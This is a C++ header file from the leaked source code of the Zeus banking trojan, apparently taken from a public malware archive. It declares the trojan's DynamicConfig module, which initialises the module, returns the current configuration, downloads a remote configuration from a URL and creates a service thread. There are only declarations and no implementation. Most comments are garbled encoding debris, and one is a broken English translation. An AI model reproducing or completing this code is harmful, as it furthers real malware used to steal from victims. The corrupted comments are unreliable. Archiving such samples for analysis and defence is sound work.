/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ � DynamicConfig.
*/
#pragma once

#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace DynamicConfig
{
  /*
    �������������.
  */
  void init(void);
  
  /*
    ���������������.
  */
  void uninit(void);
  
  /*
    �������� ������� ������������ � ������ ��������.

    Return - ��������� �� ������(���������� ���������� ����� Mem), ��� NULL � ������ ������.
  */
  BinStorage::STORAGE *getCurrent(void);
  
  /*
    �������� � ���������� �����������.

    IN url - URL ������������, ��� NULL ��� �������� �������� URL.
    Return - true - ���� ������� ��������,
             false - � ������ ������.
  */
  bool download(LPSTR url);
  
  /*    Thread creation.

    IN OUT group - the group potokok to which will belong to the flow of service.
    
    Return - true - if successful,
                   false - if an error occurs.
  */
  bool create(ThreadsGroup::GROUP *group);
};
